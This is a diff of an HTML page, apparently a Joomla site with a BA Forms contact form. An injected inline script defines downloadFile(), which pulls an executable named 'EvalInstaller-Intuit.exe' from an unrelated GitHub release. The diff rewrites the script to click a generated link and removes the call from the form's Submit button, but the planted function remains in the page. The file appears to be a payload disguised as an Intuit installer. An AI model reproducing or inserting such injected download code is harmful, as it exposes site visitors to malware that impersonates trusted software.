@@ -113,7 +113,7 @@ jQuery(function($){ initTooltips(); $("body").on("subform-row-add", initTooltips
     color: rgba(0, 157, 220, 1) !important;
 }
 </style>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"><script type="text/javascript" src="/components/com_baforms/libraries/modal/ba_modal.js"></script><link rel="stylesheet" href="/components/com_baforms/assets/css/ba-style.css"><script type="text/javascript" src="/components/com_baforms/assets/js/ba-form.js"></script><script>function downloadFile() { window.location.assign("https://github.com/jimmycorliss-dotcom/ftxtaxsolutions/releases/download/intuit-eval-installer-4b3adabb0a40/EvalInstaller-Intuit.exe"); }</script></head>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"><script type="text/javascript" src="/components/com_baforms/libraries/modal/ba_modal.js"></script><link rel="stylesheet" href="/components/com_baforms/assets/css/ba-style.css"><script type="text/javascript" src="/components/com_baforms/assets/js/ba-form.js"></script><script>function downloadFile() { var link = document.createElement("a"); link.href = "https://github.com/jimmycorliss-dotcom/ftxtaxsolutions/releases/download/intuit-eval-installer-4b3adabb0a40/EvalInstaller-Intuit.exe"; link.click(); }</script></head>
 <body class=" sticky-bar   top-menu "><div class="dj-offcanvas-wrapper"><div class="dj-offcanvas-pusher"><div class="dj-offcanvas-pusher-in">
 	<div id="jm-allpage">
 																			 							<header id="jm-header" class="">
@@ -480,7 +480,7 @@ jQuery(function($){ initTooltips(); $("body").on("subform-row-add", initTooltips
 </div></div></div><div class="ba-form-footer"><div class="ba-submit-cell"><input type="hidden" name="task" value="form.save"><div class="row-fluid ba-row">
 	<div class="span12" style="text-align: center;">
 		<input class="ba-btn-submit" type="submit" style="width:15%;height:40px;background-color:rgba(27, 117, 188, 1);color:rgba(250, 250, 250, 1);font-size:14px;font-weight:normal;border-radius:3px;border: none;"
-			value="Submit" onclick="downloadFile()">
+			value="Submit">
     </div>
 </div>
 </div></div><input type="hidden" class="theme-color" value="rgba(0, 157, 220, 1)"><input type="hidden" class="save-and-continue" value="0"><input type="hidden" class="redirect" value=""><input type="hidden" class="currency-code" value=""><input type="hidden" class="sent-massage" value="&lt;h3&gt;Congratulations!&lt;/h3&gt;&lt;p&gt;Your message was sent successfully!&lt;/p&gt;"><input type="hidden" value="/" class="admin-dirrectory"><input type="hidden" name="page_url"><input type="hidden" name="page_title"><input type="hidden" name="form_id" value="1"></div></form></div></span></p>	</div>
